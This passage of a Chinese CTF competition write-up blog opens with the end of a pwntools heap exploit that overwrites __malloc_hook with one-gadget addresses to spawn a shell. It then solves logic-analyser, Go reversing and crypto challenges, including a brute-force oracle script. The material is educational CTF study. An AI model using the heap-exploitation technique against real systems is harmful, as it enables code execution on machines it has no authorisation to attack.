class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&quot;6&quot;</span> * (<span class="number">0x60</span> - <span class="number">1</span>) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">new(<span class="string">&quot;\x00&quot;</span> * (<span class="number">0x60</span> - <span class="number">1</span>) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span> * <span class="number">0x13</span></span><br><span class="line">payload += p64(onegadget)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line">payload += <span class="string">&quot;\n&quot;</span></span><br><span class="line">edit(<span class="number">7</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>三人出境即可</p>
<h2 id="saleae"><a href="#saleae" class="headerlink" title="saleae"></a>saleae</h2><p>通过提示找到 saleae 这个软件，将数据导入，选择 SPI 协议进行分析，可以得到 flag。</p>
<p>导出的分析报告如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Time [s],Packet ID,MOSI,MISO</span><br><span class="line">0.378724400000000,,f,&#39;0&#39;</span><br><span class="line">0.378730100000000,,l,&#39;0&#39;</span><br><span class="line">0.378735800000000,,a,&#39;0&#39;</span><br><span class="line">0.378741500000000,,g,&#39;0&#39;</span><br><span class="line">0.378747300000000,,&#123;,&#39;0&#39;</span><br><span class="line">0.378753000000000,,1,&#39;0&#39;</span><br><span class="line">0.378758700000000,,2,&#39;0&#39;</span><br><span class="line">0.378764500000000,,0,&#39;0&#39;</span><br><span class="line">0.378770200000000,,7,&#39;0&#39;</span><br><span class="line">0.378775900000000,,1,&#39;0&#39;</span><br><span class="line">0.378781700000000,,3,&#39;0&#39;</span><br><span class="line">0.378787400000000,,9,&#39;0&#39;</span><br><span class="line">0.378793100000000,,7,&#39;0&#39;</span><br><span class="line">0.378798900000000,,-,&#39;0&#39;</span><br><span class="line">0.378804600000000,,1,&#39;0&#39;</span><br><span class="line">0.378810300000000,,9,&#39;0&#39;</span><br><span class="line">0.378816100000000,,d,&#39;0&#39;</span><br><span class="line">0.378821800000000,,1,&#39;0&#39;</span><br><span class="line">0.378827500000000,,-,&#39;0&#39;</span><br><span class="line">0.378833300000000,,4,&#39;0&#39;</span><br><span class="line">0.378839000000000,,8,&#39;0&#39;</span><br><span class="line">0.378844700000000,,e,&#39;0&#39;</span><br><span class="line">0.378850400000000,,6,&#39;0&#39;</span><br><span class="line">0.378856200000000,,-,&#39;0&#39;</span><br><span class="line">0.378861900000000,,b,&#39;0&#39;</span><br><span class="line">0.378867600000000,,e,&#39;0&#39;</span><br><span class="line">0.378873400000000,,8,&#39;0&#39;</span><br><span class="line">0.378879100000000,,c,&#39;0&#39;</span><br><span class="line">0.378884800000000,,-,&#39;0&#39;</span><br><span class="line">0.378890500000000,,7,&#39;0&#39;</span><br><span class="line">0.378896300000000,,8,&#39;0&#39;</span><br><span class="line">0.378902000000000,,4,&#39;0&#39;</span><br><span class="line">0.378907700000000,,b,&#39;0&#39;</span><br><span class="line">0.378913500000000,,8,&#39;0&#39;</span><br><span class="line">0.378919200000000,,9,&#39;0&#39;</span><br><span class="line">0.378924900000000,,a,&#39;0&#39;</span><br><span class="line">0.378930700000000,,9,&#39;0&#39;</span><br><span class="line">0.378936400000000,,5,&#39;0&#39;</span><br><span class="line">0.378942100000000,,e,&#39;0&#39;</span><br><span class="line">0.378947900000000,,0,&#39;0&#39;</span><br><span class="line">0.378953600000000,,7,&#39;0&#39;</span><br><span class="line">0.378959300000000,,&#125;,&#39;0&#39;</span><br></pre></td></tr></table></figure>

<p>即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12071397-19d1-48e6-be8c-784b89a95e07&#125;</span><br></pre></td></tr></table></figure>

<h2 id="24c"><a href="#24c" class="headerlink" title="24c"></a>24c</h2><p>和上一道题类似，导出的数据报告如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Time [s], Analyzer Name, Decoded Protocol Result</span><br><span class="line">0.843705500000000,I2C,Setup Write to [&#39;160&#39;] + ACK</span><br><span class="line">0.843872000000000,I2C,&#39; &#39; + ACK</span><br><span class="line">0.844038500000000,I2C,f + ACK</span><br><span class="line">0.844205000000000,I2C,1 + ACK</span><br><span class="line">0.844371000000000,I2C,6 + ACK</span><br><span class="line">0.844537500000000,I2C,3 + ACK</span><br><span class="line">0.844704000000000,I2C,b + ACK</span><br><span class="line">0.844870500000000,I2C,d + ACK</span><br><span class="line">0.845036500000000,I2C,f + ACK</span><br><span class="line">0.845203000000000,I2C,4 + ACK</span><br><span class="line">0.845369500000000,I2C,e + ACK</span><br><span class="line">0.845536000000000,I2C,&#125; + ACK</span><br><span class="line">0.845702500000000,I2C,&#39;0&#39; + ACK</span><br><span class="line">0.945796000000000,I2C,Setup Write to [&#39;160&#39;] + ACK</span><br><span class="line">0.945962500000000,I2C,&#39;0&#39; + ACK</span><br><span class="line">0.946154000000000,I2C,Setup Read to [&#39;161&#39;] + ACK</span><br><span class="line">0.946318000000000,I2C,f + ACK</span><br><span class="line">0.946481500000000,I2C,l + ACK</span><br><span class="line">0.946645000000000,I2C,a + ACK</span><br><span class="line">0.946808500000000,I2C,g + ACK</span><br><span class="line">0.946972000000000,I2C,&#123; + ACK</span><br><span class="line">0.947135500000000,I2C,c + ACK</span><br><span class="line">0.947299500000000,I2C,4 + ACK</span><br><span class="line">0.947463000000000,I2C,6 + ACK</span><br><span class="line">0.947626500000000,I2C,d + ACK</span><br><span class="line">0.947790000000000,I2C,9 + ACK</span><br><span class="line">0.947953500000000,I2C,e + ACK</span><br><span class="line">0.948117500000000,I2C,1 + ACK</span><br><span class="line">0.948281000000000,I2C,0 + ACK</span><br><span class="line">0.948444500000000,I2C,- + ACK</span><br><span class="line">0.948608000000000,I2C,e + ACK</span><br><span class="line">0.948771500000000,I2C,9 + ACK</span><br><span class="line">0.948935500000000,I2C,b + ACK</span><br><span class="line">0.949099000000000,I2C,5 + ACK</span><br><span class="line">0.949262500000000,I2C,- + ACK</span><br><span class="line">0.949426000000000,I2C,4 + ACK</span><br><span class="line">0.949589500000000,I2C,d + ACK</span><br><span class="line">0.949753000000000,I2C,9 + ACK</span><br><span class="line">0.949917000000000,I2C,0 + ACK</span><br><span class="line">0.950080500000000,I2C,- + ACK</span><br><span class="line">0.950244000000000,I2C,a + ACK</span><br><span class="line">0.950407500000000,I2C,8 + ACK</span><br><span class="line">0.950571000000000,I2C,8 + ACK</span><br><span class="line">0.950734500000000,I2C,3 + ACK</span><br><span class="line">0.950898000000000,I2C,- + ACK</span><br><span class="line">0.951061500000000,I2C,4 + ACK</span><br><span class="line">0.951225000000000,I2C,1 + ACK</span><br><span class="line">0.951388500000000,I2C,c + NAK</span><br><span class="line">5.946480500000000,I2C,Setup Write to [&#39;160&#39;] + ACK</span><br><span class="line">5.946647000000000,I2C,\t + ACK</span><br><span class="line">5.946813500000000,I2C,a + ACK</span><br><span class="line">5.946980000000000,I2C,c + ACK</span><br></pre></td></tr></table></figure>

<p>这个神奇的地方在于在接收完后又进行了修改，但是修改哪个地方是很大的问题。制表符一般会跳过 8 个字节，我其实也没想通为什么是这样，不过我尝试了 n 多次，最后终于试出来改变的位置了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c46dac10-e9b5-4d90-a883-41cf163bdf4e&#125;</span><br></pre></td></tr></table></figure>



<h2 id="usbasp"><a href="#usbasp" class="headerlink" title="usbasp"></a>usbasp</h2><p>用之前提供的软件，将协议切换为 SPI，其中的设置修改这里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable line is active high</span><br></pre></td></tr></table></figure>

<p>可以得到如下输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Time [s],Packet ID,MOSI,MISO</span><br><span class="line">1.474939400000000,,f,&#39;0&#39;</span><br><span class="line">1.474945500000000,,l,&#39;0&#39;</span><br><span class="line">1.474951600000000,,a,&#39;0&#39;</span><br><span class="line">1.474957700000000,,g,&#39;0&#39;</span><br><span class="line">1.474963800000000,,&#123;,&#39;0&#39;</span><br><span class="line">1.474969900000000,,8,&#39;0&#39;</span><br><span class="line">1.474976000000000,,5,5</span><br><span class="line">1.474982100000000,,b,&#39;0&#39;</span><br><span class="line">1.474988300000000,,0,&#39;0&#39;</span><br><span class="line">1.474994400000000,,8,&#39;0&#39;</span><br><span class="line">1.475000500000000,,4,&#39;0&#39;</span><br><span class="line">1.475006600000000,,c,&#39;0&#39;</span><br><span class="line">1.475012700000000,,6,6</span><br><span class="line">1.475018800000000,,-,-</span><br><span class="line">1.475024900000000,,4,&#39;0&#39;</span><br><span class="line">1.475031100000000,,2,&#39;0&#39;</span><br><span class="line">1.475037200000000,,e,&#39;0&#39;</span><br><span class="line">1.475043300000000,,6,&#39;0&#39;</span><br><span class="line">1.475049400000000,,-,&#39;0&#39;</span><br><span class="line">1.475055500000000,,4,&#39;0&#39;</span><br><span class="line">1.475061600000000,,9,9</span><br><span class="line">1.475067700000000,,5,&#39;5&#39;</span><br><span class="line">1.475073900000000,,c,&#39;0&#39;</span><br><span class="line">1.475080000000000,,-,&#39;0&#39;</span><br><span class="line">1.475086100000000,,8,&#39;0&#39;</span><br><span class="line">1.475092200000000,,7,&#39;0&#39;</span><br><span class="line">1.475098300000000,,b,&#39;0&#39;</span><br><span class="line">1.475104400000000,,4,0</span><br><span class="line">1.475110500000000,,-,-</span><br><span class="line">1.475116600000000,,4,&#39;4&#39;</span><br><span class="line">1.475122800000000,,6,&#39;0&#39;</span><br><span class="line">1.475128900000000,,d,&#39;0&#39;</span><br><span class="line">1.475135000000000,,f,&#39;0&#39;</span><br><span class="line">1.475141100000000,,b,&#39;0&#39;</span><br><span class="line">1.475147200000000,,1,&#39;0&#39;</span><br><span class="line">1.475153300000000,,d,d</span><br><span class="line">1.475159400000000,,f,f</span><br><span class="line">1.475165500000000,,5,&#39;1&#39;</span><br><span class="line">1.475171700000000,,8,&#39;0&#39;</span><br><span class="line">1.475177800000000,,a,&#39;0&#39;</span><br><span class="line">1.475183900000000,,0,&#39;0&#39;</span><br><span class="line">1.475190000000000,,&#125;,&#39;0&#39;</span><br><span class="line">1.475196100000000,,&#39;0&#39;,&#39;0&#39;</span><br></pre></td></tr></table></figure>

<p>就可以得到 flag 了。</p>
<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="easyGo"><a href="#easyGo" class="headerlink" title="easyGo"></a>easyGo</h2><p>用 <a target="_blank" rel="noopener" href="https://github.com/sibears/IDAGolangHelper">IDAGolangHelper</a> 以 Go1.10 版本恢复符号后，动态调试。</p>
<p>在 base64 解码之后下断点，大概位置在：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004952EB                 call    encoding_base64__ptr_Encoding_DecodeString ; encoding_base64__ptr_Encoding_DecodeString</span><br><span class="line">.text:00000000004952F0                 mov     rax, [rsp+100h+var_C8]</span><br><span class="line">.text:00000000004952F5                 mov     rcx, [rsp+100h+var_D0]</span><br><span class="line">.text:00000000004952FA                 mov     rdx, [rsp+100h+var_E8]</span><br><span class="line">.text:00000000004952FF                 mov     rbx, [rsp+100h+var_E0]</span><br><span class="line">.text:0000000000495304                 test    rcx, rcx</span><br><span class="line">.text:0000000000495307                 jnz     loc_49541B</span><br></pre></td></tr></table></figure>

<p>处。此时查看 rdx 寄存器会发现里面保存着 flag。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g29y0gp6a7j20hg07zgss.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="puzzles"><a href="#puzzles" class="headerlink" title="puzzles"></a>puzzles</h2><p>question 0 解多元方程<br>a1=4006,a2=3053,a3=2503,a4=2560 0xfa6 bed 9c7 a00<br>question 1<br>前1个和后面2个分别是质数序列上的等差数列，推测出part1<br>part1=26365399 0x1924dd7<br>后面3个就是大物高数问题，直接求解答案<br>question 2<br>part2=(1+6^3-5^3+7+1)*77=7700 0x1e14<br>question 3<br>part3=18640 0x48d0</p>
<p>question 4<br>part4=120*336=40320 0x9d80<br>最后合并起来获得flag</p>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>阅读源码会发现，输入空可以得到 flag 的加密值，我们可以因此爆破 flag。</p>
<p>爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;fc32f84bc46ac22d97e5f876e3100922.kr-lab.com&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line">strtable = [<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;plaintext&gt;&#x27;</span>)</span><br><span class="line"><span class="comment"># exit(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;result&gt;&#x27;</span>)</span><br><span class="line">flagstr = p.recvline()</span><br><span class="line">myflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> count&lt;<span class="built_in">len</span>(flagstr):</span><br><span class="line">    sli = flagstr[count:count+<span class="number">2</span>]</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;plaintext&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> strtable:</span><br><span class="line">        p.sendline(myflag+ch)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;result&gt;&#x27;</span>)</span><br><span class="line">        retflag = p.recvline()</span><br><span class="line">        <span class="comment"># print retflag</span></span><br><span class="line">        retsli = retflag[count:count+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> retsli == sli:</span><br><span class="line">            myflag=myflag+ch</span><br><span class="line">            <span class="built_in">print</span> myflag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    count = count + <span class="number">2</span></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://asuri.org/2019/04/22/Asuri_2019/" data-id="clg6iymq40038guot4yn01ypo" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/07/30/2019-googlectf-writeup-part1/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          2019-googlectf-writeup-part1
        
      </div>
    </a>
  
  
    <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">从一道题讲PHP复杂变量</div>
    </a>
  
</nav>

  
</article>

</section>
        
        <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" 